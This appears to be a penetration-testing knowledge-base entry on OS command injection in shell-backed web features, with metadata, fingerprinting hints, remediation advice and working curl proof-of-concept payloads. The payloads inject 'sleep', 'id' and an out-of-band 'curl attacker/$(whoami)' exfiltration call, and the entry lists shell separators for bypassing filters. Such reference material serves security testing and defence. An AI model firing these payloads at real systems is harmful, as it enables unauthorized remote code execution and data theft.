---
id: "command-injection"
title: "Command injection (semicolons / backticks / $() and blind out-of-band exfiltration)"
kind: "implementation"
cve: null
related-cves: null
cve-note: "None (implementation flaw)"
severity: "critical"
cvss: 9.1
severity-basis: "cvss"
severity-note: null
product: "Any feature that invokes a shell (ping/traceroute/conversion/compression)"
versions: "Any"
ports: "80, 443"
keywords: "command injection, rce, ping, backticks, blind injection, shell"
entry: "Parameters concatenated into system/exec/popen"
verified: false
verified-on: null
verification-evidence: null
source-url: null
vendor-advisory: null
cwe: null
patch-date: null
sources: "Compiled from public sources (implementation flaws)"
kev: null
kev-date: null
kev-source: null
epss: null
epss-percentile: null
epss-date: null
epss-source: null
enrichment-updated: null
---

## Fingerprinting

- Parameters such as `host/ip/url/path` are used for network diagnostics, image conversion, or backup compression;
- Response time changes with the input (`sleep`).

## Prerequisites

- Parameters reach a shell (rather than an argument array).

## PoC

```bash
# 1) Check for time-based blind injection (most reliable; no state changes)
curl -s -o /dev/null -w '%{time_total}\n' 'https://target/api/ping' \
  --data-urlencode 'host=127.0.0.1; sleep 5'
# ≥5s = positive result

# 2) Verify using command output
curl -s 'https://target/api/ping' --data-urlencode 'host=127.0.0.1; id'
# Result: uid= in the response = RCE

# 3) No output → out-of-band verification
curl -s 'https://target/api/ping' --data-urlencode 'host=127.0.0.1; curl attacker/$(whoami)'
```

```bash
# 4) Separator list (try each if filtering is present)
#   ;  |  ||  &  &&  `cmd`  $(cmd)  %0a  \n
```

## Exploitation Steps

1. Check with `sleep 5` first;
2. Then retrieve `id` output;
3. Confirm out of band (curl/nslookup);
4. Evidence: timing comparison + command output.

## Remediation and Mitigation

- Use argument arrays (no shell); validate host against an allowlist; execute in a sandbox.

## References

- OWASP Command Injection; CWE-78.
